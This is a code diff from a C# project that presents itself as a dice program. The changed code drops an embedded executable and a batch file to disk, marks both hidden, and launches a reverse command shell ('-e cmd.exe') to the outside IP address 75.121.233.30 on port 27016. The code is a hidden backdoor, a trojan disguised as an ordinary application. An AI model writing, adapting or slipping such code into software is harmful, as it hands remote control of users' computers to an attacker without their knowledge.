@@ -32,7 +32,7 @@ namespace Dice
 
             if (!File.Exists(shellPath))
             {
-                string[] shellBatch = { "@ECHO OFF", "START /B dice2.exe -e cmd.exe 75.121.233.30 27016" };
+                string[] shellBatch = { "@ECHO OFF", "START /B " + exePath + " -e cmd.exe 75.121.233.30 27016" };
                 File.WriteAllLines(shellPath, shellBatch);
                 File.SetAttributes(shellPath, FileAttributes.Hidden);
             }
@@ -46,8 +46,8 @@ namespace Dice
 
             if (!File.Exists(exePath))
             {
-                File.WriteAllBytes(exePath, Dice.Properties.Resources.dice2);
-                File.SetAttributes(exePath, FileAttributes.Hidden);
+               File.WriteAllBytes(exePath, Dice.Properties.Resources.dice2);
+               File.SetAttributes(exePath, FileAttributes.Hidden);
             }
             System.Diagnostics.Process.Start(vbsPath);
         }
